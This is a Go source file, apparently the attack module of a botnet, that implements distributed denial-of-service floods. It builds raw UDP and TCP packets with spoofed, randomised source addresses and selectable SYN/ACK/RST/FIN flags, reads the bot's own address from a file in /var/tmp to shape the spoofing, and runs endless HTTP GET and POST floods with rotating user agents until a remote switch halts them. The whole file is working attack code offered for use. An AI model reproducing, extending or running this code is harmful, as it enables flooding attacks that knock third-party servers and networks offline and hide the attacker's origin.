package lib

import (
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func sockBuffer(packetSize string) []byte {
	size := convInt(packetSize)
	if size < 50 || size > 1400 {
		size = 100
	}
	return make([]byte, size)
}

func rawSocket(rawProtocol int) net.PacketConn {
	sock, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, rawProtocol)
	syscall.SetsockoptInt(sock, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	syscall.SetsockoptInt(sock, syscall.IPPROTO_IP, syscall.SO_REUSEADDR, 1)
	conn, _ := net.FilePacketConn(os.NewFile(uintptr(sock), fmt.Sprint(sock)))
	return conn
}

func setupOpt() (gopacket.SerializeBuffer, *gopacket.SerializeOptions) {
	buffer := gopacket.NewSerializeBuffer()
	opts := &gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	return buffer, opts
}

func setupIPv4(srcv4, dstv4 net.IP, protov4 layers.IPProtocol) *layers.IPv4 {
	ipv4 := &layers.IPv4{
		SrcIP:    srcv4,
		DstIP:    dstv4,
		Version:  4,
		TTL:      255,
		Protocol: protov4,
	}
	return ipv4
}

func (a *Attack) setupUDP(udpSrc, udpDst *net.UDPAddr) []byte {
	sBuffer, sOpt := setupOpt()
	udpv4 := setupIPv4(udpSrc.IP.To4(), udpDst.IP.To4(), layers.IPProtocolUDP)
	udpLayers := &layers.UDP{
		SrcPort: layers.UDPPort(udpSrc.Port),
		DstPort: layers.UDPPort(udpDst.Port),
	}
	udpLayers.SetNetworkLayerForChecksum(udpv4)
	gopacket.SerializeLayers(sBuffer, *sOpt, udpv4, udpLayers, gopacket.Payload(a.ddosPayload))
	return sBuffer.Bytes()
}

func (a *Attack) setupTCP(tcpSrc, tcpDst *net.TCPAddr) []byte {
	sBuffer, sOpt := setupOpt()
	tcpv4 := setupIPv4(tcpSrc.IP.To4(), tcpDst.IP.To4(), layers.IPProtocolTCP)
	setWin, _ := strconv.ParseUint(genRange(65535, 25), 0, 16)
	tcpLayers := &layers.TCP{
		SrcPort: layers.TCPPort(tcpSrc.Port),
		DstPort: layers.TCPPort(tcpDst.Port),
		Window:  uint16(setWin),
		SYN:     a.synFlag,
		ACK:     a.ackFlag,
		RST:     a.rstFlag,
		PSH:     a.pshFlag,
		FIN:     a.finFlag,
		URG:     a.urgFlag,
	}
	tcpLayers.SetNetworkLayerForChecksum(tcpv4)
	gopacket.SerializeLayers(sBuffer, *sOpt, tcpv4, tcpLayers, gopacket.Payload(a.ddosPayload))
	return sBuffer.Bytes()
}

func (a *Attack) randDstPort() int {
	if a.dstPort == "-r" {
		return rand.Intn(65535)
	}
	return convInt(a.dstPort)
}

func (a *Attack) randSrcIP() string {
	if a.srcAddr == "-r" {
		var randArr []string
		getIP := execComd("tail", "-1", "/var/tmp/"+fileName(true))
		manageGetIP := strings.Split(getIP, ".")

		manageSrcRange := func(loopTimes, rtnElems, ipElems int) string {
			/*
				loop times 4 --> xxx.xxx.xxx.xxx
				loop times 3 --> 123.xxx.xxx.xxx
				loop times 2 --> 123.123.xxx.xxx
				loop times 1 --> 123.123.123.xxx
			*/
			if loopTimes < 4 {
				randArr = append(randArr, strings.Join(manageGetIP[0:ipElems], "."), ".")
			}
			for i := 1; i <= loopTimes; i++ {
				randArr = append(randArr, genRange(255, 0), ".")
			}
			randArr[len(randArr)-1] = ""
			return strings.Join(randArr[0:rtnElems], "")
		}
		convIP := convInt(manageGetIP[0])

		/*
			If The bot info file is not found, then do a full randomization (worst case).
		*/
		if getIP == "Fail to execute command!!!" {
			return manageSrcRange(4, 7, 0)
		}

		if convIP < 127 || (convIP >= 225 && convIP <= 239) || (convIP >= 240 && convIP <= 250) {
			return manageSrcRange(3, 7, 1)
		} else if convIP >= 128 && convIP <= 191 {
			return manageSrcRange(2, 5, 2)
		} else if convIP >= 193 && convIP <= 223 {
			return manageSrcRange(1, 4, 3)
		}
	}
	return a.srcAddr
}

func setupHTTP(method, url, header string, body io.Reader) (*http.Client, *http.Request, error) {
	httpReq, err := http.NewRequest(method, url+header, body)
	return &http.Client{}, httpReq, err
}

func (a *Attack) getRequest() {
	get, getReq, reqErr := setupHTTP("GET", a.url, "", a.attackBody)
	for {
		for agent := range httpAgents {
			getReq.Header.Set("User-Agent", httpAgents[agent])
			get.Do(getReq)
			if callSwitch, keySwitch := SetupCaller(); keySwitch {
				if callSwitch.CallAttack.attackSwitch {
					break
				}
			}
		}
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallAttack.attackSwitch || reqErr != nil {
				break
			}
		}
	}
}

func (a *Attack) postRequest() {
	post, postReq, reqErr := setupHTTP("POST", a.url, "", a.attackBody)
	for {
		post.Do(postReq)
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallAttack.attackSwitch || reqErr != nil {
				break
			}
		}
	}
}

func (a *Attack) udpPacket() {
	conn := rawSocket(syscall.IPPROTO_UDP)
	for {
		/*
			Setup UDP dst.
		*/
		dst := &net.UDPAddr{
			IP:   net.ParseIP(a.dstAddr),
			Port: a.randDstPort(),
		}
		/*
			Setup UDP src.
		*/
		udp := a.setupUDP(
			&net.UDPAddr{
				IP:   net.ParseIP(a.randSrcIP()),
				Port: rand.Intn(65535),
			}, dst)
		/*
			Send UDP packet.
		*/
		conn.WriteTo(udp,
			&net.IPAddr{
				IP: dst.IP,
			},
		)
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallAttack.attackSwitch {
				break
			}
		}
	}
}

func (a *Attack) tcpPacket() {
	conn := rawSocket(syscall.IPPROTO_TCP)
	for {
		/*
			Setup TCP dst.
		*/
		dst := &net.TCPAddr{
			IP:   net.ParseIP(a.dstAddr),
			Port: a.randDstPort(),
		}
		/*
			Setup TCP src.
		*/
		tcp := a.setupTCP(
			&net.TCPAddr{
				IP:   net.ParseIP(a.randSrcIP()),
				Port: rand.Intn(65535),
			}, dst)
		/*
			Send TCP packet.
		*/
		conn.WriteTo(tcp,
			&net.IPAddr{
				IP: dst.IP,
			},
		)
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallAttack.attackSwitch {
				break
			}
		}
	}
}
